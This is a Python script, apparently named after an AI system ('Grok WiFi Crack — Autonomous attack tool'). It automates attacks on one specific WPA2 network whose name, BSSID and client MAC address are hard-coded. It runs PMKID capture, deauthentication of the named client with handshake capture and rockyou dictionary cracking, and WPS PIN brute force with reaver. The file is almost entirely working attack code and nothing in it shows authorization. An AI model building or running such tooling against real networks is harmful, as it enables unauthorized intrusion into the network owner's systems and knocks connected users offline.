#!/usr/bin/env python3
"""
Grok WiFi Cracking Script — ready for USB WiFi adapter
Target: WiFimodem-DDE1 (4C:19:5D:F2:DD:E6, Ch 6, WPA2-CCMP-PSK)

USAGE:
  python3 wifi_crack.py                    # Use default interface
  python3 wifi_crack.py -i wlan1mon        # Specify interface
  python3 wifi_crack.py -i wlan1 --wps     # WPS attack mode

NOTE: Intel iwlwifi CNVi CANNOT capture uplink EAPOL frames.
      You MUST use a USB WiFi adapter with proper monitor mode support:
      - Alfa AWUS036ACH (RTL8812AU)    
      - TP-Link TL-WN722N v1 (Atheros)
      - Panda PAU09 (RT5572)
"""
import subprocess, time, os, sys, argparse, glob

AP_BSSID = "4C:19:5D:F2:DD:E6"
AP_CH = "6"  
AP_ESSID = "WiFimodem-DDE1"
CLIENT = "B8:D8:2D:51:98:88"
DICT = "/usr/share/wordlists/rockyou.txt"

# === PERMANENT UTF-8 ENCODING FIX ===
_UTF8_ENV = {**__import__('os').environ, 'PYTHONIOENCODING': 'utf-8', 'LANG': 'C.UTF-8', 'LC_ALL': 'C.UTF-8'}

def run(cmd, timeout=300, bg=False):
    if bg:
        return subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        r = subprocess.run(cmd, shell=True, timeout=timeout, capture_output=True, text=True, encoding='utf-8', errors='replace', env=_UTF8_ENV)
        return (r.stdout + r.stderr)[-3000:]
    except subprocess.TimeoutExpired:
        return "TIMEOUT"

def check_handshake(capfile):
    out = run(f"sudo aircrack-ng {capfile}", 20)
    if "0 handshake" not in out and "handshake" in out:
        return True
    # Also check with tshark
    eapol = run(f"sudo tshark -r {capfile} -Y 'eapol' -c 5", 20)
    if eapol and "Message 2" in run(f"sudo tshark -r {capfile} -Y 'eapol' -V", 30):
        return True
    return False

def crack_handshake(capfile):
    print(f"\n🏆 HANDSHAKE FOUND! Cracking with rockyou.txt...")
    out = run(f"sudo aircrack-ng -w {DICT} {capfile}", 600)
    print(out)
    if "KEY FOUND" in out:
        for line in out.split("\n"):
            if "KEY FOUND" in line:
                print(f"\n🎉🎉🎉 PASSWORD: {line}")
                return True
    return False

def phase_deauth_capture(iface, duration=120):
    """Standard deauth + capture approach"""
    print(f"\n{'='*60}")
    print(f"🚀 PHASE: DEAUTH + CAPTURE ({duration}s) on {iface}")
    print(f"{'='*60}")
    
    cap = f"/tmp/grok_wifi_{int(time.time())}"
    
    # Start capture
    run(f"sudo airodump-ng {iface} -c {AP_CH} --bssid {AP_BSSID} -w {cap} --output-format pcap", bg=True)
    time.sleep(3)
    
    # Send 3 deauths, then wait
    run(f"sudo aireplay-ng -0 3 -a {AP_BSSID} -c {CLIENT} {iface}", 15)
    
    # Split: 20% deauth, 80% listen
    deauth_time = int(duration * 0.2)
    listen_time = duration - deauth_time
    
    for i in range(deauth_time // 5):
        run(f"sudo aireplay-ng -0 1 -a {AP_BSSID} -c {CLIENT} {iface}", 10)
        time.sleep(5)
    
    print(f"🤫 Passive listening for {listen_time}s...")
    time.sleep(listen_time)
    
    run("sudo pkill airodump-ng")
    time.sleep(2)
    
    # Check results
    caps = sorted(glob.glob(f"{cap}*.cap"), key=os.path.getsize, reverse=True)
    for c in caps[:3]:
        sz = os.path.getsize(c)
        print(f"📦 {c} ({sz} bytes)")
        if sz > 5000 and check_handshake(c):
            crack_handshake(c)
            return True
        elif sz > 5000:
            # Try anyway
            run(f"sudo aircrack-ng -w {DICT} {c}", 60)
    
    print("❌ No handshake captured")
    return False

def phase_pmkid(iface, duration=60):
    """PMKID attack using hcxdumptool"""
    print(f"\n{'='*60}")
    print(f"🚀 PHASE: PMKID ATTACK ({duration}s) on {iface}")
    print(f"{'='*60}")
    
    run(f"sudo pkill hcxdumptool", 5)
    run(f"rm -f /tmp/pmkid_*.pcapng /tmp/pmkid_*.16800", 5)
    
    # hcxdumptool v7 syntax  
    run(f"sudo timeout {duration} hcxdumptool -i {iface} -c {AP_CH}a -w /tmp/pmkid_raw.pcapng --rds=2", duration + 10)
    
    # Convert
    run(f"sudo hcxpcapngtool -o /tmp/pmkid_hash.16800 /tmp/pmkid_raw.pcapng", 30)
    
    if os.path.exists("/tmp/pmkid_hash.16800") and os.path.getsize("/tmp/pmkid_hash.16800") > 0:
        print("🎯 PMKID hash extracted!")
        with open("/tmp/pmkid_hash.16800") as f:
            for line in f:
                print(f"   {line.strip()[:120]}")
        # Crack with hashcat or aircrack-ng
        return True
    
    print("❌ No PMKID captured")
    return False

def phase_wps(iface, duration=300):
    """WPS PIN brute force using reaver"""
    print(f"\n{'='*60}")
    print(f"🚀 PHASE: WPS BRUTE FORCE ({duration}s) on {iface}")
    print(f"{'='*60}")
    
    # Need managed mode for WPS
    run(f"sudo ip link set {iface} down")
    run(f"sudo iw dev {iface} set type managed")
    run(f"sudo ip link set {iface} up")
    
    # Pixie dust first
    out = run(f"sudo timeout 60 reaver -i {iface} -b {AP_BSSID} -c {AP_CH} -K 1 -vv", 70)
    if "WPS pin" in out.lower() or "PSK" in out:
        print(f"🎯 WPS CRACKED!")
        print(out)
        return True
    
    # Standard brute force with delay (avoid rate limiting)
    out = run(f"sudo timeout {duration} reaver -i {iface} -b {AP_BSSID} -c {AP_CH} -vv -L -N -d 5 -T 10", duration + 10)
    print(out[-2000:])
    
    if "WPS pin" in out.lower() and "not found" not in out.lower():
        return True
    
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Grok WiFi Crack — Autonomous attack tool")
    parser.add_argument("-i", "--interface", default="wlan0", help="WiFi interface (default: wlan0)")
    parser.add_argument("--wps", action="store_true", help="Try WPS attack instead of handshake")
    parser.add_argument("--pmkid", action="store_true", help="Try PMKID attack instead")
    parser.add_argument("-t", "--time", type=int, default=120, help="Capture time in seconds")
    args = parser.parse_args()
    
    print("═════════════════════════════════════════")
    print("  🏴‍☠️  GROK WIFI CRACK  🏴‍☠️")
    print(f"  Target: {AP_ESSID} ({AP_BSSID})")
    print(f"  Interface: {args.interface}")
    print("═════════════════════════════════════════")
    
    # Setup monitor mode
    print("\n📡 Setting up monitor mode...")
    run(f"sudo ip link set {args.interface} down")
    run(f"sudo iw dev {args.interface} set type monitor")
    run(f"sudo ip link set {args.interface} up")
    run(f"sudo iw dev {args.interface} set channel {AP_CH}")
    time.sleep(2)
    
    result = False
    if args.wps:
        result = phase_wps(args.interface, args.time)
    elif args.pmkid:
        result = phase_pmkid(args.interface, args.time)
    else:
        # Try all phases
        result = phase_pmkid(args.interface, 60)
        if not result:
            result = phase_deauth_capture(args.interface, args.time)
        if not result:
            result = phase_wps(args.interface, 300)
    
    # Restore managed mode
    print("\n📡 Restoring managed mode...")
    run(f"sudo ip link set {args.interface} down")
    run(f"sudo iw dev {args.interface} set type managed")
    run(f"sudo ip link set {args.interface} up")
    
    if result:
        print("\n🎉 MISSION ACCOMPLISHED!")
    else:
        print("\n❌ Mission failed — need compatible WiFi adapter")
        print("   Recommended: Alfa AWUS036ACH, TP-Link TL-WN722N v1")
